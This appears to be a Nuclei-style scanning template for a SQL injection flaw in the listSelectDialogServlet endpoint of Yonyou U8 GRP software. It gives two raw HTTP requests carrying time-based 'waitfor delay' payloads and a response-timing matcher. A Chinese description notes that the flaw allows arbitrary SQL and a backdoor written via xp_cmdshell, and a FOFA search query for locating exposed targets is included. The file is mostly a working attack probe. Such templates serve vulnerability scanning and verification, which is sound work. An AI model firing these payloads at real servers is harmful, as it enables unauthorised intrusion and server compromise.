http:
    - matchers:
        - condition: and
          dsl:
            - duration_1>=4 && duration_1<=5
            - duration_2>=8 && duration_2<=9
          type: dsl
      raw:
        - |
          GET /listSelectDialogServlet?slType=slFZX&slCdtn=1=2;waitfor%20delay%20%270:0:4%27 HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
        - |
          GET /listSelectDialogServlet?slType=slFZX&slCdtn=1=2;waitfor%20delay%20%270:0:8%27 HTTP/1.1
          Host: {{Hostname}}
          User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36
id: yongyouU8-GRP-listSelectDialogServlet-sql-time
info:
    author: Superhero
    description: |-
        fofa: app="用友-GRP-U8"
        用友 U8 GRP listSelectDialogServlet 接口存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xpcmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
    name: 用友U8 GRP listSelectDialogServlet SQL注入漏洞
    reference:
        - https://mp.weixin.qq.com/s/oCZL8e_u2zKMBpOGridZhw
    severity: high
    tags:
        - 用友-GRP-U8
        - 用友u8
        - Servlet
        - 用友U8
